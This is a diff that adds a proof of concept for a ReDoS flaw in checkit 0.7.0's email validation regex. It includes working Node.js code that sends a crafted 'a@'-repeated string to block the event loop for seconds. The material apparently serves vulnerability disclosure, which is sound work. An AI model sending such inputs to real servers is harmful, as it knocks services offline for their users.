@@ -1,0 +1,25 @@
+Confirmed: checkit 0.7.0's `email` rule regex (`/^(.+)@(.+)\.(.+)$/i`) causes catastrophic (quadratic) backtracking, blocking the event loop for seconds on a single validation call with attacker-controlled input.
+
+```javascript
+// ReDoS in checkit@0.7.0 - the built-in "email" validation rule uses
+// the regex /^(.+)@(.+)\.(.+)$/i (see node_modules/checkit/core.js),
+// whose nested greedy groups cause quadratic (effectively catastrophic)
+// backtracking on crafted input, freezing the Node.js event loop.
+
+const Checkit = require("checkit");
+
+// Attacker-controlled input: many '@' characters force the regex engine
+// to explore an enormous number of ways to split the string across the
+// three capture groups before failing to match.
+const maliciousInput = "a@".repeat(60000) + "a";
+
+const checkit = new Checkit({ email: "email" });
+
+console.log("Starting validation - this should return almost instantly for benign input...");
+const start = Date.now();
+
+checkit.validateSync({ email: maliciousInput });
+
+console.log("Validation blocked the event loop for", Date.now() - start, "ms");
+console.log("A few hundred KB of attacker input can hang a server for many seconds (DoS).");
+```
